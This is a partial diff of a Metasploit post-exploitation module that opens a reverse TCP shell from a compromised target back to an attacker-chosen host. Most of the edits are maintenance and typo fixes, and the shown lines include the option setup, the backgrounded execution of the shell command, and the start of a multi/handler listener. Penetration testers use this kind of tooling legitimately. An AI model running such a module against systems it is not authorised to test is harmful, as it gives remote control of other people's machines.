@@ -1,19 +1,16 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'rex'
-
-class Metasploit3 < Msf::Post
+class MetasploitModule < Msf::Post
 
   def initialize(info={})
     super( update_info( info,
         'Name'          => 'Multi Manage System Remote TCP Shell Session',
         'Description'   => %q{
           This module will create a Reverse TCP Shell on the target system
-          using the system own scripting enviroments installed on the
+          using the system's own scripting environments installed on the
           target.
         },
         'License'       => MSF_LICENSE,
@@ -23,15 +20,15 @@ class Metasploit3 < Msf::Post
       ))
     register_options(
       [
-        OptAddress.new('LHOST',
+        OptAddressLocal.new('LHOST',
           [true, 'IP of host that will receive the connection from the payload.']),
         OptInt.new('LPORT',
           [false, 'Port for Payload to connect to.', 4433]),
         OptBool.new('HANDLER',
-          [ true, 'Start an Exploit Multi Handler to receive the connection', false]),
+          [ true, 'Start an exploit/multi/handler to receive the connection', false]),
         OptEnum.new('TYPE', [true, 'Scripting environment on target to use for reverse shell',
           'auto', ['auto','ruby','python','perl','bash']])
-      ], self.class)
+      ])
   end
 
   # Run Method for when run command is issued
@@ -58,8 +55,8 @@ class Metasploit3 < Msf::Post
     end
 
     if not cmd.empty?
-      print_status("Executing reverse tcp shel to #{lhost} on port #{lport}")
-      session.shell_command_token("(#{cmd} &)")
+      print_status("Executing reverse tcp shell to #{lhost} on port #{lport}")
+      cmd_exec("(#{cmd} &)")
     end
   end
 
@@ -111,12 +108,12 @@ class Metasploit3 < Msf::Post
     return conflict
   end
 
-  # Starts a multi/handler session
+  # Starts a exploit/multi/handler session
   def create_multihand(lhost,lport)
     pay = client.framework.payloads.create("generic/shell_reverse_tcp")
     pay.datastore['LHOST'] = lhost
     pay.datastore['LPORT'] = lport
-    print_status("Starting exploit multi handler")
+    print_status("Starting exploit/multi/handler")
     if not check_for_listner(lhost,lport)
       # Set options for module
       mul = client.framework.exploits.create("multi/handler")
